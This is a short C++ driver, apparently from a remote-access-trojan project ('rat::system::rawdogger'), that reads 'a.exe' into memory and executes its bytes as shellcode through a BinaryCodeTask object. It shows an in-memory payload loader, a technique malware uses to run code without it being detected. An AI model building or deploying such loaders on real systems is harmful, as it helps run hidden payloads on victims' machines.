#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <cstdlib>

#include "rat/system.hpp"
#include "rat/system/rawdogger.hpp"
#include "rat/system/types.hpp" // BinaryCodeTask
#include "rat/system/debug.hpp"

int main() {
    using namespace rat::system::rawdogger;
    std::vector<uint8_t> code;
    if(!rat::system::readBytesFromFile("a.exe", code)  )  {
        ERROR_LOG("Failed at reading bytes to memory\n");
        return 1;
    }
    // Prepare BinaryCodeTask
    BinaryCodeTask task("a.exe");
    task.setShellCode(std::move(code));

    // Execute shell code
    bool success = task.executeBinaryCodeTask();

    if (success) {
        std::cout << "Shell code executed successfully!" << std::endl;
    } else {
        std::cout << "Shell code execution failed!" << std::endl;
    }

    // Memory will be freed automatically by BinaryCodeTask destructor
    return 0;
}
